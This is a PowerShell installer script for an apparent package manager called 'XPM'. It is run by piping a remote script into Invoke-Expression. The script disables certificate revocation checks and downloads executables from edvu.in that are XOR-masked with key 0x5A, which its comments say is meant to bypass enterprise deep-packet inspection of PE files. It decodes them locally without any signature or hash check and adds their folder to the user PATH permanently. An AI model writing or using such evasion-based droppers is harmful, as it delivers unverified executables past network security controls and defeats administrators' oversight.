# XPM Installer for Windows PowerShell
# Quick run: irm https://edvu.in/i | iex

$ErrorActionPreference = 'Stop'

# Configure TLS 1.2/1.3 and bypass certificate revocation check on restricted Wi-Fi
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
[Net.ServicePointManager]::CheckCertificateRevocationList = $false

# Inline high-performance decoder to bypass enterprise Wi-Fi deep-packet inspection (PE magic bytes)
try {
    Add-Type -TypeDefinition @"
using System;
using System.IO;

public class XpmDecoder {
    public static void Unmask(string src, string dst, byte key) {
        byte[] b = File.ReadAllBytes(src);
        for (int i = 0; i < b.Length; i++) {
            b[i] ^= key;
        }
        File.WriteAllBytes(dst, b);
    }
}
"@ -ErrorAction SilentlyContinue
} catch {}

Write-Host ""
Write-Host "  __   __ ___  __  __ " -ForegroundColor Red
Write-Host "  \ \ / /| _ \|  \/  |" -ForegroundColor Red
Write-Host "   \ V / |  _/| |\/| |" -ForegroundColor Yellow
Write-Host "    |_|  |_|  |_|  |_|" -ForegroundColor Cyan
Write-Host "  Native Universal Package Manager" -ForegroundColor Gray
Write-Host ""

$installDir = "$HOME\.xpm-bin"
$binPath = "$installDir\xpm.exe"
$xpxBinPath = "$installDir\xpx.exe"

$xpmSafeUrl = "https://edvu.in/xpm.dat"
$xpxSafeUrl = "https://edvu.in/xpx.dat"
$xpmWinUrl = "https://edvu.in/xpm-win"
$xpxWinUrl = "https://edvu.in/xpx-win"
$xpmExeUrl = "https://edvu.in/xpm.exe"
$xpxExeUrl = "https://edvu.in/xpx.exe"

Write-Host "==> Installing XPM & XPX to $installDir..." -ForegroundColor Cyan

# 1. Create target directory
if (-not (Test-Path $installDir)) {
    New-Item -ItemType Directory -Path $installDir -Force | Out-Null
}

# 2. Check local repo source first
$localSource = "$PSScriptRoot\xpm.exe"
$parentLocalSource = "$PSScriptRoot\..\public\xpm.exe"
$xpxLocalSource = "$PSScriptRoot\xpx.exe"
$xpxParentLocalSource = "$PSScriptRoot\..\public\xpx.exe"

$installed = $false

if (Test-Path $localSource) {
    Write-Host "==> Installing from local bundle..." -ForegroundColor Gray
    Copy-Item -Path $localSource -Destination $binPath -Force
    if (Test-Path $xpxLocalSource) { Copy-Item -Path $xpxLocalSource -Destination $xpxBinPath -Force }
    $installed = $true
} elseif (Test-Path $parentLocalSource) {
    Write-Host "==> Installing from repo bundle..." -ForegroundColor Gray
    Copy-Item -Path $parentLocalSource -Destination $binPath -Force
    if (Test-Path $xpxParentLocalSource) { Copy-Item -Path $xpxParentLocalSource -Destination $xpxBinPath -Force }
    $installed = $true
}

# 3. Method A: Deep-Packet-Inspection (DPI) safe stream (guaranteed to bypass Wi-Fi PE blocks)
if (-not $installed) {
    Write-Host "==> Downloading XPM (DPI-safe stream)..." -ForegroundColor Gray
    $tempSafe = "$env:TEMP\xpm_s_$([Guid]::NewGuid().ToString('N')).bin"
    try {
        Invoke-WebRequest -Uri $xpmSafeUrl -OutFile $tempSafe -UseBasicParsing
        $fileSize = (Get-Item $tempSafe).Length
        if ($fileSize -gt 1000000) {
            [XpmDecoder]::Unmask($tempSafe, $binPath, 0x5A)
            Remove-Item $tempSafe -Force -ErrorAction SilentlyContinue
            $installed = $true

            # Download xpx runner
            $tempXpxSafe = "$env:TEMP\xpx_s_$([Guid]::NewGuid().ToString('N')).bin"
            try {
                Invoke-WebRequest -Uri $xpxSafeUrl -OutFile $tempXpxSafe -UseBasicParsing -ErrorAction SilentlyContinue
                if ((Get-Item $tempXpxSafe).Length -gt 1000000) {
                    [XpmDecoder]::Unmask($tempXpxSafe, $xpxBinPath, 0x5A)
                }
                Remove-Item $tempXpxSafe -Force -ErrorAction SilentlyContinue
            } catch {
                Remove-Item $tempXpxSafe -Force -ErrorAction SilentlyContinue
            }
        } else {
            Remove-Item $tempSafe -Force -ErrorAction SilentlyContinue
        }
    } catch {
        Remove-Item $tempSafe -Force -ErrorAction SilentlyContinue
    }
}

# 4. Method B: Extensionless URL fallback
if (-not $installed) {
    Write-Host "==> Retrying via extensionless stream..." -ForegroundColor Gray
    try {
        Invoke-WebRequest -Uri $xpmWinUrl -OutFile $binPath -UseBasicParsing
        if ((Get-Item $binPath).Length -gt 1000000) {
            $installed = $true
            try {
                Invoke-WebRequest -Uri $xpxWinUrl -OutFile $xpxBinPath -UseBasicParsing -ErrorAction SilentlyContinue
            } catch {}
        } else {
            Remove-Item -Path $binPath -Force -ErrorAction SilentlyContinue
        }
    } catch {
        Remove-Item -Path $binPath -Force -ErrorAction SilentlyContinue
    }
}

# 5. Method C: Standard direct EXE fallback
if (-not $installed) {
    Write-Host "==> Retrying via direct URL..." -ForegroundColor Gray
    try {
        Invoke-WebRequest -Uri $xpmExeUrl -OutFile $binPath -UseBasicParsing
        $installed = $true
        try {
            Invoke-WebRequest -Uri $xpxExeUrl -OutFile $xpxBinPath -UseBasicParsing -ErrorAction SilentlyContinue
        } catch {}
    } catch {
        Write-Host "❌ Failed to download XPM binaries: $_" -ForegroundColor Red
        Write-Host "   If you are on a restricted Wi-Fi network, switch to a mobile hotspot or visit https://edvu.in" -ForegroundColor Yellow
        exit 1
    }
}

# Ensure xpx runner command exists (if xpx.exe is not present, generate cmd wrapper)
if (-not (Test-Path $xpxBinPath) -and -not (Test-Path "$installDir\xpx.cmd")) {
    $xpxCmdContent = "@echo off`r`n`"%~dp0xpm.exe`" x %*"
    Set-Content -Path "$installDir\xpx.cmd" -Value $xpxCmdContent -Encoding ASCII
}

# 6. Add to User PATH permanently if not already present
$userPath = [Environment]::GetEnvironmentVariable('Path', 'User')
if ($userPath -notlike "*$installDir*") {
    Write-Host "==> Adding $installDir to User PATH..." -ForegroundColor Cyan
    $newPath = if ($userPath) { "$userPath;$installDir" } else { $installDir }
    [Environment]::SetEnvironmentVariable('Path', $newPath, 'User')
}

# 7. Refresh PATH in current session
if ($env:Path -notlike "*$installDir*") {
    $env:Path = "$env:Path;$installDir"
}

Write-Host ""
Write-Host "==> XPM installed successfully!" -ForegroundColor Green
Write-Host "Run 'xpm --help' or 'xpm login' to get started." -ForegroundColor White
Write-Host ""
